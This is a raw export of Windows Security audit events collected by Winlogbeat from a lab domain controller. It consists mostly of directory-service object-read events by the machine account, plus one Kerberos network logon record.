"May 28, 2026 @ 21:03:14.436"	"uxDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649E5B

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0x649e5b	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110228	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.436"	"uhDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649E5B

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{136b2f78-f565-44e5-94fa-df669a4fa178}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{136b2f78-f565-44e5-94fa-df669a4fa178}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x649e5b	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110227	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.436"	"uRDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649E5B

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0x649e5b	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110226	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.436"	"uBDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649E5B

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x649e5b	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110225	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.436"	"txDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649E5B

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x649e5b	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110224	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.435"	"thDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649E5B

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x649e5b	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110223	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.435"	"tRDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649E5B

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x649e5b	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110222	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.435"	"tBDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649E5B

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0x649e5b	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110221	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.435"	"sxDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649E5B

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x649e5b	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110220	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.435"	"shDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x649E5B

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x649e5b	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110219	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:14.432"	"sRDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x649E5B
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.251
	Source Port:		50494

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.251"	50494	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x649e5b	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"2,120"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110217	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 21:03:14.323"	"sBDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:16.019"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBE5C

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a86-0de6-11d0-a285-00aa003049e2}
		{4c164200-20c0-11d0-a768-00aa006e0529}
			{bf967a68-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
